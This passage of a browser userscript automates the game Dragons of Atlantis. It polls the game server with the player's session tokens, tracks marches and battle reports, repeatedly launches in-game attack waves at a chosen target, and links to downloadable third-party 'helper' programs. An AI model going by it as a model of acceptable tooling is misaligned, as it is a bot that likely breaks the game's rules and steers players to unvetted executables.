  show : function (tf){
    var t = WinTracker;
    if (Data.options.ptWinIsOpen == tf)
      return;
    Data.options.ptWinIsOpen = tf;
    mainPop.show (tf);
    if (tf){
      if (t.but)
        t.but.className = 'toolbuttOff';
      clearInterval(t.timer);
    } else {
      t.timer = setInterval (t.blink, 1500);
    }
  },
  setBlinkElement : function (e){
    WinTracker.but = e;
  },
  blink : function (){
    var t = WinTracker;
    if (t.but.className == 'toolbuttOff')
      t.but.className = 'toolbutOn';
    else
      t.but.className = 'toolbuttOff';
  },
}

function onUnload (){
  Data.options.ptWinPos = mainPop.getLocation();
  logit ('=============  onUnload: save win pos');
}

function dialogFatal (msg){
  pop = new CPopuppa ('dtfatal', 200,300, 401,300, true); 
  pop.getMainDiv ().innerHTML = '<STYLE>'+ Styles +'</style><BR>'+ msg ;
  pop.getTopDiv ().innerHTML = '<B><CENTER><FONT COLOR=#5D902A>Uh ohs</center></b>' ;
  pop.show(true);
}

var RequestQueue = {
  que : {},
  add : function (id, func, maxWaitMillis){
    var t = RequestQueue;
    var now = serverTime();
    var maxWait = maxWaitMillis/1000;
    if (isNaN(maxWaitMillis))
      maxWait = 1;
    if (t.que[id]){
      if (now+maxWaitMillis >= t.que[id][2])
        return;      
      clearTimeout(t.que[id][1]);  
    } 
    var timer = setTimeout (function(){myFunc(id)}, maxWait*1000);
    t.que[id] = [func, timer, now+maxWait];
//dispQ ('RequestQueue.add id='+ id);  
    function myFunc(id){
      var t = RequestQueue;
      var func = t.que[id][0];
      delete t.que[id];
//dispQ ('RequestQueue.doit id='+ id);  
      func();
    }
    
    function dispQ (msg){
    var now = serverTime();
      var m = msg + ' (now='+ now +'):\n';
      for (var p in RequestQueue.que)
        m += p +' : '+ RequestQueue.que[p][1] +' : '+ RequestQueue.que[p][2] +' ('+ (RequestQueue.que[p][2]-now) +')\n';
      WinLog.write (m);
    }   
  }, 

  isPending : function (id){
    var t = RequestQueue;
    return t.que[id]?true:false;
  },
}

function checkVersion (){
  //if (IsChrome)return;
  var now = new Date().getTime()/1000;
  if (Data.options.version.lastCheck > now-(VERSION_CHECK_HOURS*3600))
    return;
  logit ('CHECKING VERSION.....');   
  var timer = setTimeout (checkVersion, VERSION_CHECK_HOURS*3600*1000);
  GM_xmlhttpRequest({
    method: 'GET',
    url: WebSite,

    onload : function(r){ // TODO: Translate
      var m = r.responseText.match (/var \s*Version\s*=\s*\'(.*)\'/m);
      if (m && m[1]!=Data.options.version.checkVersion){
        clearTimeout (timer);
        pop = new CPopuppa ('dtver', Data.options.ptWinPos.x, Data.options.ptWinPos.y, 300,220, Data.options.ptWinDrag, remindLater); 
        pop.getTopDiv ().innerHTML = '<CENTER><FONT COLOR=#FFFFFF><B>Nuova versione disponibile!!!</b></center>';
        pop.getMainDiv ().innerHTML = '<STYLE>'+ Styles +'</style><BR><CENTER>TGE Tools un YEni versiyonu Var<BR><BR>Version: '+ m[1] 
        +'<BR><BR>sul sito: <A HREF="http://'+ WebSite +'">'+ WebSite +'</a><BR><BR><INPUT id=doaVerRML type=submit value="Ricordamelo dopo"\>      <INPUT id=doaVerDR DISABLED type=submit value="Non ricordarmelo piu\'"\></center>';
        pop.setLayer(20);
        pop.show(true);
        document.getElementById('doaVerRML').addEventListener('click', remindLater, false);
        document.getElementById('doaVerDR').addEventListener('click', function(){dontRemind(m[1])}, false);
      }
    },
  });
  function remindLater (){
    pop.show(false);
    Data.options.version.lastCheck = now;
    setTimeout (checkVersion, VERSION_CHECK_ITER*1000);
  }
  function dontRemind (v){
    Data.options.version.checkVersion = v;
    pop.show(false);
    Data.options.version.lastCheck = now;
    setTimeout (checkVersion, VERSION_CHECK_ITER*1000);
  }
}

// TODO: reduce n/w traffic - cache up requests
var Messages = {
  readList : [],
  fetchTimer : null,
  lastQueued : 0,
  battleReportListeners : [],
  checkBusy : false,
  
  init : function (){
    Messages.checkMessages(500);
    window.addEventListener ('unload', Messages.onUnload, false);
  },
  
  marchAtTarget : function (){
    var t = Messages;
    t.checkMessages();
  },

  deleteQueue : [],
  deleteMessage : function (msgId){
    var t = Messages;
    if (t.deleteQueue.length == 0)
      t.deleteTimer = setTimeout (doit, 60000);
    t.deleteQueue.push (msgId);
    function doit (){
      var t = Messages;
//logit ('DELETE MESSAGES:\n'+ inspect (t.deleteQueue, 5, 1));      
      Ajax.messageDelete (t.deleteQueue, function (rslt){
        var t = Messages;
        t.deleteQueue = [];
      });
    }
  },

  onUnload : function (){
    var t = Messages;
    if (t.deleteQueue.length>0)
      Ajax.messageDelete (t.deleteQueue);
    t = Tabs.Options;
    if (t.idsToDelete.length>0)
      Ajax.messageDelete (t.idsToDelete);
},
  
  // check for battle reports
  checkMessages : function (maxWaitMillis){
    var t = Messages;
    if (t.battleReportListeners.length==0)
      return;
    if (maxWaitMillis == null)
      maxWaitMillis = 30000;
    RequestQueue.add ('checkMessages', doit, maxWaitMillis);      
      
    function doit (){
      Ajax.messageList ('all', 1, function (rslt){
        var t = Messages;
        if (rslt==null)
          return;
  //logit ('messageList:\n' + inspect (rslt, 7, 1));        
        for (var i=rslt.length-1; i>=0; i--){
          if (rslt[i].report_type=="BattleReport" && !rslt[i].read_at){
            if (t.readList.indexOf(rslt[i].id) < 0)
              t.readList.push (rslt[i].id);
          }
        }
        clearTimeout (t.fetchTimer);
        if (t.readList.length > 0)
          t.fetchTimer = setTimeout (t.fetchNext, 2000);
      });
    }
  },  
 
  fetchNext : function (){
    var t = Messages;
    var id = t.readList[0];
    if (!id){
      logit ('t.readList BAD MESSAGE ID:\n'+ inspect (t.readList, 8, 1));
      return;
    }    
    clearTimeout (t.fetchTimer);
    Ajax.messageDetail (id, function (rslt){
      var t = Messages;
      t.readList.shift();
      t.gotBattleReport (rslt);
      if (t.readList.length > 0)
        t.fetchTimer = setTimeout (t.fetchNext, 2500);
    });
  },
  
  gotBattleReport : function (rpt){
    var t = Messages;
if (DEBUG_MARCHES) WinLog.write ('Read Message: '+ rpt.report.location.terrain +' , '+ rpt.report.location.x +','+  rpt.report.location.y +' Generale: '+ rpt.report.attacker.general.id );    
    for (var i=0; i<t.battleReportListeners.length; i++)
      t.battleReportListeners[i](rpt);
  },
  addBattleReportListener : function (notify){
    var t = Messages;
    t.battleReportListeners.push (notify);
  },
  removeBattleReportListener : function (notify){
    var t = Messages;
    var i = t.battleReportListeners.indexOf (notify);
    if (i>=0)
      t.battleReportListeners.splice (i, 1);
  },
}

Date.prototype.myString = function (){
  return this.toDateString() +' '+ this.toTimeString().substr (0,8);
}

Date.prototype.formatTime = function (){
  var curr_hour = this.getHours();
  var curr_min = this.getMinutes();
  var curr_sec = this.getSeconds();
  return (curr_hour<10?'0':'')+curr_hour+gFormatTime+(curr_min<10?'0':'')+curr_min+gFormatTime+(curr_sec<10?'0':'')+curr_sec;
}

Date.prototype.formatDate = function (){
  var curr_day = this.getDate();
  var curr_month = this.getMonth();
  curr_month++;
  var curr_year = this.getFullYear();
  return (curr_day<10?'0':'')+curr_day+gFormatDate+(curr_month<10?'0':'')+curr_month+gFormatDate+curr_year;
}

var Seed = {
  s : {},   // seed data  from server 
  cityIdx : {},   // 'indicies'
  cityTs : {},    // timestamps of last update
  jobs : {},      // by city
  marches : {},
  numMarches : 0,
  generals : {},
  numGenerals : 0,
  serverTimeOffset : 0,
  resources : {ore : 0, gold : 0, food : 0, wood : 0, stone : 0},
  ratefood : 0,
  firstTime : false,
  firstTower : false,
    
  init : function (callback){
    var t = Seed;
    t.fetchSeed(callback);
    setInterval (t.tick, 1000);
  },
  
  tick : function (){     // called once per second - to check for job completion
    var t = Seed;
    var now = serverTime () - 1;
    // delete expired marches ...
    for (var pm in t.marches){
      var march = t.marches[pm];
      if ((march.run_at < now-30)   || (march.status=='ritorno' && march.run_at < now-2)){
        delete (t.marches[pm]);
        --Seed.numMarches;
      }
    }
    // check for job completion
    for (var pcity in t.jobs){
      for (var pjob in t.jobs[pcity]){
        var job = t.jobs[pcity][pjob];
        if (job.run_at < (now - 300)){
          if (!job.done){
//WinLog.write ('****** TIMER Seed.tick: RETAINING \'UNDONE\' JOB  (now='+ serverTime() +'):\n'+ inspect (job, 4, 1)); 
//logit ('****** TIMER Seed.tick: RETAINING \'UNDONE\' JOB  (now='+ serverTime() +'):\n'+ inspect (job, 4, 1)); 
          } else
          delete (t.jobs[pcity][pjob]);
        } else if (!job.done && job.run_at<now){
//WinLog.write ('TIMER Seed.tick: fetchCity JOB  (now='+ serverTime() +'):\n'+ inspect (job, 4, 1)); 
          job.done = true;
delete (t.jobs[pcity][pjob]);
          var march = Seed.marches[job.march_id];
// if (!march), march just finished (returned)          
          if (march && job.queue=='march' && march.status=='Gonderiliyor..'){  // march just reached target
            if (DEBUG_MARCHES) WinLog.write ('MARCH at TARGET!');
            Messages.marchAtTarget(march);
          }
          t.fetchCity (pcity);
          return;
        }
      }
    }
  },

  fetchSeed : function (notify) {
    var t = Seed;
    var now = new Date().getTime() / 1000;
    new MyAjaxRequest ('player.json', {'user%5Fid':C.attrs.user_id, 'dragon%5Fheart':C.attrs.dragon_heart, '%5Fsession%5Fid':C.attrs.session_id, version:12, timestamp:parseInt(serverTime()) }, function (rslt){
      if (rslt.ok){
        if (rslt.dat.timestamp)
          t.serverTimeOffset = rslt.dat.timestamp - now;
        t.s = rslt.dat; 
        try {
          for (var i=0; i<rslt.dat.cities.length; i++){
            t.updateCity (i);
          }
        } catch (e) {
          rslt.ok = false;
          rslt.errmsg = e.toString();
        }
      }
      if (notify)
        notify (rslt);
    },false);
  },

  // if fetchcity is pending, will notify when complete, else notifies right away...
  updateNotifyQueue : [],
  notifyOnUpdate : function (notify){
    var t = Seed;
    if (!RequestQueue.isPending('fetchCity')){
      notify();
      return;
    }
    t.updateNotifyQueue.push (notify);
  },
  
  // TODO: fix march destination when city (shows as bog)
  updateCity : function (cityIdx){
    var t = Seed;
    var scity = t.s.cities[cityIdx];
    if (!Seed.cityIdx[scity.id])
      Seed.cityIdx[scity.id] = cityIdx;
    Seed.cityTs[scity.id] = serverTime();  
    if (cityIdx == 0){
      // generals
      for (var i=0; i<scity.generals.length; i++)
        Seed.generals[scity.generals[i].id] = scity.generals[i];
      Seed.numGenerals = scity.generals.length;
      // marches
      for (var i=0; i<scity.marches.length; i++)
        t.checkAddMarch (scity.marches[i]);    
    }
    // jobs
    for (var i=0; i<scity.jobs.length; i++)
      t.checkAddJob (scity.jobs[i]);
//logit ('Seed.updateCity: '+ inspect (city, 5, 1));
    for (var i=0; i<t.updateNotifyQueue.length; i++)
      t.updateNotifyQueue[i]();
    t.updateNotifyQueue = []; 
  },
  
  checkAddMarch : function (march){
    if (march.general_id)
      Seed.generals[march.general_id].busy = true;
    if (Seed.marches[march.id]){
      if (march.status=='retreating')
        Seed.marches[march.id].status='Donuyor';
      return;
    }
    var m = cloneProps(march);  
    if (m.status =='marching') // TODO: Translate
      m.status = 'Gonderiliyor..';
    if (m.status =='encamped')
      m.status = 'accampato';
    if (m.march_type == 'AttackMarch')
      m.march_type = 'Atak Gonderiliyor';
    else if (m.march_type == 'TransportMarch')
      m.march_type = 'Trasporto';
    if (m.status == 'retreating')
      m.status = 'Donuyor';
    m.target = m.terrain_type;
    if (m.target == 'Bog')
      m.target = 'Citta\'  '+ m.destination_name;
    else if (m.target == 'AnthropusCamp')
      m.target = 'Campo Anthropus';
    else if (m.target == 'Outpost')
    m.target = 'Avamposto';
    else if (m.target == 'Grassland')
    m.target = 'Savana';
    else if (m.target == 'Swamp')
    m.target = 'Palude';
    else if (m.target == 'Lake')
    m.target = 'Lago';
    else if (m.target == 'Hill')
    m.target = 'Colline';
    else if (m.target == 'Plain')
    m.target = 'Pianura';
    else if (m.target == 'Mountain')
    m.target = 'Montagne';
    else if (m.target == 'Forest')
    m.target = 'Foresta'; 
    Seed.marches[m.id] = m;
    ++Seed.numMarches;
 },
  
  checkAddJob : function (job){
    var cityId = job.city_id;
if (!job.run_at){
  WinLog.write ('checkAddJob job.run_at is null:\n'+ inspect (job, 5, 1));
  if (ALERT_ON_BAD_DATA) alert ('checkAddJob job.run_at is null');
}    
    if (!Seed.jobs[cityId])
      Seed.jobs[cityId] = {};
    if (job.queue == 'march'){
      if (!Seed.marches[job.march_id]){
        WinLog.write ('checkAddJob MISSING MARCH:\n'+ inspect (job, 5, 1) +'\n'+ inspect(Seed.marches, 5, 1));
        if (ALERT_ON_BAD_DATA) alert ('checkAddJob MISSING MARCH');
        if (job.run_at < serverTime())
          return;               // ?????? delete from Seed.jobs  ????
      } else {  
        Seed.marches[job.march_id].run_at = job.run_at;
        Seed.marches[job.march_id].duration = job.duration;
      }
    }
       
    if (Seed.jobs[cityId][job.id])
      return;
    job.run_at += 2;      
    Seed.jobs[cityId][job.id] = cloneProps(job);
  },
  
  jsonAddJob : function (job){  // called from various jsons (buildUpgrade) when new job rx'd 
    var t = Seed;
    t.checkAddJob (job);
  },

  jsonGotCity : function (dat){  // call from various jsons when seed data rx'd
    var t = Seed;
    var cityIdx = Seed.cityIdx[dat.city.id];
//logit ('Seed.updateCity: '+ cityIdx +' ('+ dat.city.id +')'); 
    t.s.cities[cityIdx] = dat.city;
    if (dat.city == t.s.cities[0]) {
      try {
        t.resources = dat.city.resources;
        t.ratefood = dat.city.figures.resource_rates.food.rate;
      } catch (e){
      }
    }
    try {
      t.updateCity (cityIdx);
    } catch (e){
      WinLog.write ('***********'+ e);
    }
  },

  checkIncomingData : function (rslt){
    // check seed for missing building ...      
    for (var ij=0; ij<rslt.dat.city.jobs.length; ij++){
      var job = rslt.dat.city.jobs[ij];
      if (job.queue == 'building'){
        var building = null;
        for (var im=0; im<rslt.dat.city.buildings.length; im++){
          if (rslt.dat.city.buildings[im].id == job.city_building_id){
            building = rslt.dat.city.buildings[im];
            break;
          }
        }
        if (!building){
          WinLog.writeText ('*********************** MISSING BUILDING! ('+ job.city_building_id +') now='+ serverTime() +'\n' + inspect (job, 7, 1) +'\n'+ inspect (rslt, 12, 1));
        if (ALERT_ON_BAD_DATA) alert ('Danger Will Robinson! (missing building)');   
        }
      }
    }
    
    if (!rslt.dat.city.marches)
      return;
    // check seed for missing march ...  
    for (var ij=0; ij<rslt.dat.city.jobs.length; ij++){
      var job = rslt.dat.city.jobs[ij];
      if (job.march_id){
        if (Seed.findMarch(job.march_id, rslt.dat.city.marches) == null){
          WinLog.writeText ('*********************** MISSING MARCH, Job ID:'+ job.march_id +' (now='+ serverTime() +')\n'+ inspect (job, 7, 1) +'\n'
                  + inspect (rslt, 12, 1));
        if (ALERT_ON_BAD_DATA) alert ('Danger Will Robinson! (missing march)');   
        }
      }
    }   
    // check seed for missing march job ...  
    for (var im=0; im<rslt.dat.city.marches.length; im++){
      var march = rslt.dat.city.marches[im];
      var job = null;
      for (var ij=0; ij<rslt.dat.city.jobs.length; ij++){
        if (rslt.dat.city.jobs[ij].march_id == march.id){
          job = rslt.dat.city.jobs[ij];
          break;
        }
      }
      if (job==null){
        WinLog.writeText ('*********************** MISSING JOB FOR MARCH!  marchId:'+ march.id +'\n'+ inspect (rslt, 11, 1));
        if (ALERT_ON_BAD_DATA) alert ('MISSING JOB FOR MARCH!');   
      }
    }
  },
  
  findMarch : function (mid, marches){
    for (var im=0; im<marches.length; im++){
      if (marches[im].id == mid)
        return marches[im];
    }
    return null;
  },
 
  fetchCity : function (cityId, maxTime){  // do on job completion
    if (maxTime==null)
      maxTime = 5000;
    RequestQueue.add ('fetchCity', doit, maxTime);    
    function doit (){    
      new MyAjaxRequest ('cities/'+ cityId +'.json', { 'user%5Fid':C.attrs.user_id, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.session_id, version:12, 'dragon%5Fheart':C.attrs.dragon_heart }, function (rslt){
        var t = Seed;
        if (rslt.ok){
          t.checkIncomingData(rslt);
          if (rslt.dat.timestamp)
            t.serverTimeOffset = rslt.dat.timestamp - (new Date().getTime() / 1000);
          t.jsonGotCity (rslt.dat);
        }
      },false);
    }
  },
}


function generalList (cityIdx){
  var ret = {};
  var gens = Seed.s.cities[cityIdx].generals;
  for (var i=0; i<gens.length; i++)
    ret[gens[i].id] = gens[i].name +' ('+ gens[i].rank +')';
  return ret;
}

//************************************Information-Tab**********************************************

Tabs.Help = {
  tabOrder : HELP_TAB_ORDER,
  tabDisabled : false,
	tabLabel : gVagina,
  cont : null,
  timer : null,
  
 init : function (div){
    var t = Tabs.Help;
    t.cont = div;
		var stTitleBlu = 'background-color: #444444; font-weight:bold;text-align:center; color:#5D902A;';
        var stTitleRosso = 'background-color: #5D902A; font-weight:bold;';

		var m = '';
		m += '<TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">'+ Title +'<BR>Versiyon '+ Version +'<BR>'+ WebSite +'<BR>'+ Ideatore +'<BR></td></tr>';
		m += '</table>'; // TODO: Translate

		m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">ProEkipWNA Toolsta Problem mi Yasiyorsun?<BR></td></tr>';
		m += '<TR><TD><center><a href="http://www.facebook.com/DoaPowerTools">Haber Vermek Icin Tikla</center></a></td></tr>';
		m += '</table>';
		
		
		m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">Linkler</td></tr>';
	    m += '<TR><TD><center>ProEkip Yardim Sayfasi</center></td><TD><center><a href="http://www.ProEkip.com/">Dragons of Atlantis Turkce Forumu</center></a></td></tr>';
	    m += '<TR><TD><center>Toolsun FaceBook Sayfasi</center></td><TD><center><a href="http://www.facebook.com/DoaPowerTools">Buraya Tikla..</center></a></td></tr>';
		m += '<TR><TD><center>Bozkir Taktikleri</center></td><TD><center><a href="http://dragonsofatlantis.wikia.com/wiki/Wilderness"> DoA Wiki Bozkirlar</center></a></td></tr>';
		m += '<TR><TD><center>Antropus Taktikleri</center></td><TD><center><a href="http://dragonsofatlantis.wikia.com/wiki/Anthropus_Camps"> DoA Wiki Antropus Kamplari</center></a></td></tr>';
		m += '</table>';
		
		m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">Yardimci Programlar</td></tr>';		
		m += '<TR><TD><center>DoA Helper v1.4.8 Alpha</center></td><TD><center><a href="http://www.megaupload.com/?d=QCWG0Z25">Doa Helper B.E. 1.4.8 Alpha</center></a></td></tr>';
        m += '<TR><TD><center>Doa Helper v.1.5.1</center></td><TD><center><a href="http://www.megaupload.com/?d=H10U562U">Doa Helper v.1.5.1</center></a></td></tr>';
		m += '</table>';
	    

		m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">DoA TGE Tools</td></tr>';		
		m += '<TR><TD><center>-CLL RHY--EasyMaster-+Darkous+-Sekmeler------</center></td></tr>';
		m += '<TR><TD><center>--CLL RHY--EasyMaster-+Darkous+-Bot Testi--</center></td></tr>';
		m += '<TR><TD><center>---CLL RHY--EasyMaster-+Darkous+-Renkler-</center></td></tr>';
		m += '<TR><TD><center>--CLL RHY--EasyMaster-+Darkous+-Hazirlayan-</center></td></tr>';
		m += '<TR><TD><center>-CLL RHY--EasyMaster-+Darkous+-Sunan---------</center></td></tr>';
		m += '<TR><TD><center>Yukon + KIZILIRMAK.</center></td></tr>';
                m += '</table>';
               
                m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">EasyMaster</td></tr>';
                m += '<BR><BR><TABLE width=100%><TR><TD colspan=3 align=center style="' + stTitleBlu + '">Cll RHY</td></tr>';
                m += '<TR><TD><center>-|www.ProEkip.Com|-</center></td></tr>';
		 
		
    div.innerHTML = m;
		
	
		
  },

  show : function (){
  },
  hide : function (){
  },


}


//************************************Wave-Tab**********************************************

// TODO: Translate
Tabs.Waves = {
  tabOrder : WAVE_TAB_ORDER,
  tabLabel : gWave,
  tabDisabled : false,
  cont : null,
  troopList : ['Casus', 'Okcu', 'SD', 'CAD', 'Ates A', 'ZP', 'Zeplin', 'Su D.', 'Tas D.', 'Ates D.', 'Lav D.'],    
  enabled : false,
  attackTimer : null,
  marchTimer: null,
  attackErrors : 0,
  numAttacks: 0,
  
  init : function (div){
    var t = Tabs.Waves;
    t.cont = div;

    if (Data.options.waves == null){
      Data.options.waves = {enabled:false, timeLimit:240, iterationMin:5, iterationMax:7, stopOnLoss:true, deleteReports:false, curTarget:0, targets:[], tsStarted:serverTime(), runTime:0};
      for (var i=0; i<5; i++)
        Data.options.waves.targets[i] = {enabled:false, lastAttack:0, troopsWave1:{}, troopsWave2:{}, targetX:0, targetY:0, terrainType:null, terrainLevel:0, stats:{numAttacks:0, spoils:{}}};
    }
    if (!Data.options.waves.iterationMin)
      Data.options.waves.iterationMin = 5;
    if (Data.options.waves.maxMarches == undefined)
    Data.options.waves.maxMarches = 10; 
    var gensel = htmlSelector (generalList(0), '', 'id=pbrptGenSel');
    var m = '<DIV class=pbTitle>'+translate( 'Spamlerde 1 Hedefe Saldir.' )+'</div>\
       <DIV id=pbwaveStatus class=pbStatBox style="margin-bottom:5px !important">\
       <CENTER><INPUT type=submit value="OnOff" id=pbwaveEnable></input></center>\
       <DIV id=pbwaveMarches style="height:165px; max-height:165px; overflow-y:auto;"></div>\
      <DIV id=pbwaveFeedback style="height: 17px; border:1px solid #AA00FF; background-color:#6B6258; padding: 2px 0px; text-align:center; font-weight:bold"></div></div>\
      <INPUT type=submit value="'+translate('Bozkir 1-5')+'" id=pbatTerre></input>\
      <INPUT type=submit value="'+translate('Bozkir 6-10')+'" id=pbatTerre2></input>\
      <DIV class=pbInput>\
      <DIV style="height:48px;"><B>'+translate( 'Hedef Kordinatlari' )+':</b>    X: <INPUT id=pbwaveX size=1 maxlength=3 type=text value="'+ Data.options.waves.targets[0].targetX +'" /> Y: <INPUT id=pbwaveY size=2 maxlength=3 value="'+ Data.options.waves.targets[0].targetY +'" type=text/>    <B>'+translate( 'Mesafe' )+': </b> <SPAN id=pbwaveDist></span><BR><BR>\
        <DIV class=pbStatBox style="margin:0px 10px !important"><CENTER><SPAN id=pbwaveTile></span></center></div></div>\
      <TABLE class=pbTab id=pbwaveTroops><TR align=center class=pbTabHdr1><TD colspan=8><BR>'+translate( 'ASKERLER' )+':</td></tr></table>\
      <BR><TABLE class=pbTabPad>\
      <TR><TD class=pbTableft>'+translate( 'Saldiri Raporlarini Temizle' )+':</td><TD><INPUT id=pbwaveDBR type=checkbox '+ (Data.options.waves.deleteReports?'CHECKED ':'') +'/></td></tr>\
      <TR><TD class=pbTableft>'+translate( 'Asker Kaybinda Durdur' )+':</td><TD><INPUT id=pbwaveSTL type=checkbox '+ (Data.options.waves.stopOnLoss?'CHECKED ':'') +'/></td></tr>\
      <TR><TD class=pbTableft>'+translate( 'Saldiriler  Sure Farki' )+':</td><TD><INPUT id=pbwaveDelay type=text size=1 maxlength=4 value="'+ Data.options.waves.iterationMin +'" \> '+translate( 'to' )+' <SPAN id=pbwaveDelMax>'+ Data.options.waves.iterationMax +'</span> '+translate( 'Saniye' )+'</td></tr>\
      <TR><TD class=pbTableft>'+translate( 'Max. Yollanacak Saldiri' )+':</td><TD><INPUT id=pbwavecfgMM size=1 type=text maxlength=2 value="'+ Data.options.waves.maxMarches +'"\></td></tr>\
      </table></div>\
      <DIV class=pbStatBox style="margin-top:10px !important">\
        <CENTER><INPUT id=pbwaveResStat type=submit value="'+translate( 'Statuyu Resetle' )+'" /></center>\
      <DIV id=pbwaveStats  style="height:200px; max-height:200px; overflow-y:auto"></div>\
      <HR class=thin><DIV id=pbwaveCurSpoil>  </div></div>';
    t.cont.innerHTML = m;
    document.getElementById('pbwaveEnable').addEventListener ('click', function(){t.setWaveEnable(!Data.options.waves.enabled)}, false);
    document.getElementById('pbwaveX').addEventListener ('change', t.eventCoords, false);
    document.getElementById('pbwaveY').addEventListener ('change', t.eventCoords, false);
    document.getElementById('pbwaveResStat').addEventListener ('click', t.resetStats, false);
    document.getElementById('pbwaveDBR').addEventListener ('click', function(e){Data.options.waves.deleteReports=e.target.checked}, false);
    document.getElementById('pbwaveSTL').addEventListener ('click', function(e){Data.options.waves.stopOnLoss=e.target.checked}, false);
    document.getElementById('pbwaveDelay').addEventListener ('change', delayChanged, false);
    document.getElementById('pbwavecfgMM').addEventListener('change', maxMarchesChanged, false);
    document.getElementById('pbatTerre').addEventListener ('click', t.helpPopT, false);
    document.getElementById('pbatTerre2').addEventListener ('click', t.helpPopT2, false);
//    troopTable (document.getElementById('pbwaveTroops'), 1, 'FW', t.eventTroops);
    troopTable (document.getElementById('pbwaveTroops'), 1, 'AW', t.eventTroops);
    window.addEventListener('unload', t.onUnload, false);
    t.setWaveEnable (Data.options.waves.enabled);
    t.marchTick();
    t.eventCoords();
    t.dispStats();
    Messages.addBattleReportListener(t.gotBattleReport);

    function maxMarchesChanged (e){
    var val = parseIntNan(document.getElementById('pbwavecfgMM').value);
    if (val<0 || val>12){
    e.target.style.backgroundColor = 'red';
    return;
    }
    e.target.style.backgroundColor = '';
    Data.options.waves.maxMarches = val;
    } 
 
    function troopTable (tab, rownum, prefix, listener){
      var row1 = tab.insertRow(rownum);
      row1.align='center';
      var row2 = tab.insertRow(rownum+1);
      row2.align='center';
      var val;
      for (var i=0; i<t.troopList.length; i++){
        row1.insertCell(i).innerHTML = ''+translate( t.troopList[i] );
        var inp = document.createElement ('INPUT');
        inp.type = 'text';
        inp.size = '1';
        inp.maxlength='6';
        if (prefix=='AW')
          val = Data.options.waves.targets[0].troopsWave2[Names.troops.byAbbr[t.troopList[i]][1]];
        if (!val)
          val = 0;
        inp.value = val;
        inp.addEventListener ('change', listener, false);
        inp.name = prefix +'_'+ i;
        row2.insertCell(i).appendChild (inp);
      }
      return tab;
    }
    
    function delayChanged (e){
      var min = parseIntZero(e.target.value);
      var max = parseInt(min * 1.5);
      if (min<5 || min>3600){
        // error dialog, etc ...
        e.target.style.backgroundColor = 'red';
        return;
      }
      document.getElementById('pbwaveDelMax').innerHTML = max;
        e.target.style.backgroundColor = '';
      Data.options.waves.iterationMin = min;
      Data.options.waves.iterationMax = max;
    }
  },

  curRunStart : 0,
  gotBattleReport : function (rpt){
    var t = Tabs.Waves;
    if (rpt.report.location.x==Data.options.waves.targets[0].targetX && rpt.report.location.y==Data.options.waves.targets[0].targetY){
      ++Data.options.waves.numAttacks;
      for (var i=0; i<rpt.report.spoils.items.length; i++){
        if (!Data.options.waves.targets[0].stats.spoils[rpt.report.spoils.items[i]])
          Data.options.waves.targets[0].stats.spoils[rpt.report.spoils.items[i]] = 1;
        else
          ++Data.options.waves.targets[0].stats.spoils[rpt.report.spoils.items[i]];
        document.getElementById('pbwaveCurSpoil').innerHTML = new Date().toTimeString().substring (0,8) +': '+ Names.itemAbbr(rpt.report.spoils.items[i]);
      }
      t.dispStats();
      
      if (Data.options.waves.stopOnLoss){
        for (var p in rpt.report.attacker.units){
          if (rpt.report.attacker.units[p][0] != rpt.report.attacker.units[p][1]){
            var ts = new Date(rpt.report_notification.created_at * 1000).myString();
            t.setWaveEnable (false);
            t.dispFeedback ('Troops Lost! ('+ ts +')');
            actionLog ('Wave Troops Lost! ('+ ts +')');
            return;
          }
        }
      }
      if (Data.options.waves.deleteReports && rpt.report.attacker.name == Seed.s.name)
        Messages.deleteMessage(rpt.report_notification.id);
    }
  },
  
   /***TABELLE TERRE 1-5***/

  helpPopT : function (){
		var stTitle = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var stTitle2 = 'background-color: #2BB524; font-weight:bold;';
		var stTitle3 = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var s0 = 'http://img62.imageshack.us/img62/1582/16857792.gif';
        var s1 = 'http://img683.imageshack.us/img683/8149/31096760.gif';
        var s2 = 'http://img706.imageshack.us/img706/1485/40621535.gif';
        var s3 = 'http://img148.imageshack.us/img148/9913/21372285.gif';
        var s4 = 'http://img90.imageshack.us/img90/1061/24344413.gif';
        var s5 = 'http://img691.imageshack.us/img691/3886/85305366.gif';

		var m = ''; // TODO: Translate
		m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle + '">Bu Tablo Darkous Tarafindan KoC Wiki Sitesinden Alinan Bilgilerce Hazirlanmistir..<BR></td></tr>';
  	m += '<TABLE width=100% bgcolor=#ffffff><TR><TD colspan=4 align=center style="' + stTitle2 + '"><A target="_tab" href="http://www.proekip.com/showthread.php/47-Antropus-Kamplar%C4%B1-ve-G%C3%B6ller-Da%C4%9Flar-Ovalar-Asker-Say%C4%B1s%C4%B1">Daha Fazlasi icinn Buraya Tikla</a></td></tr>';
  	m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle3 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Sorunlarin icin Buraya Tikla ve Mesaj At..</a></td></tr>';
	m += '<TR><TD> </td><TD></td><TD></TD></tr>';
  	m += '<TR><TD><b><center>Level</center></b></td><TD><center>Asker</center></td><TD><center>General</center></td><TD><center>Araştırma Levelleri</center></TD></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		m += '<TR><TD></td><TD><center>50 Minotaur</center></td><TD><center><img src="'+ s0 +'"></center></td><TD><center>Metaluriji: 2 Tıp: 2 Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>100 Minotaur </center></td><TD><center><img src="'+ s1 +'"></center></td><TD><center>Metalürüji: 1 Tıp: 0 Kalibrasyon: 0</center></Td></tr>';
		m += '<TR><TD></td><TD><center>10 ÇAD</center></td><TD><center><img src="'+ s2 +'"></center></td><TD><center>Metalürüji: 1 Tıp: 0 Dragon Bilimi: 2</center></Td></tr>';
